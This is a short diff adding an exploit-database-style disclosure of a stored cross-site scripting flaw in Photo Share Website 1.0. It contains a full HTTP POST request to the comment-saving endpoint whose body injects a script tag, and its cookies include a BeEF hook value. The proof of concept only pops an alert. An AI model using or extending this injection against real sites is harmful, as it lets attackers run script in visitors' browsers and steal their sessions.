@@ -1,0 +1,28 @@
+# Exploit Title: Photo Share Website 1.0 - Persistent Cross-Site Scripting
+# Date: 2020-09-30
+# Exploit Author: Augkim
+# Vendor Homepage: https://www.sourcecodester.com/php/14478/photo-share-website-using-phpmysql-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/photo-share-website-using-php.zip
+# Tested on: Linux Apache2
+
+
+POST /soci/ajax.php?action=save_comment HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0)
+Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 45
+DNT: 1
+Connection: close
+Referer: http://localhost/soci/index.php?page=home
+Cookie: mode=day; src=1;
+BEEFHOOK=0hqrkHLyTmW38TaPrDHRUW4LsDpXKDSSqAQf54dt0hIA0wFNpjkoJYFlnGhoKw2T4qQHIUZ5oESFGSVW;
+PHPSESSID=cq8j6ug2vem0obmno6fi0h9404; access=1
+Origin: foo.example.org
+
+PoC:
+post_id=4&comment="><script>alert(2)</script>
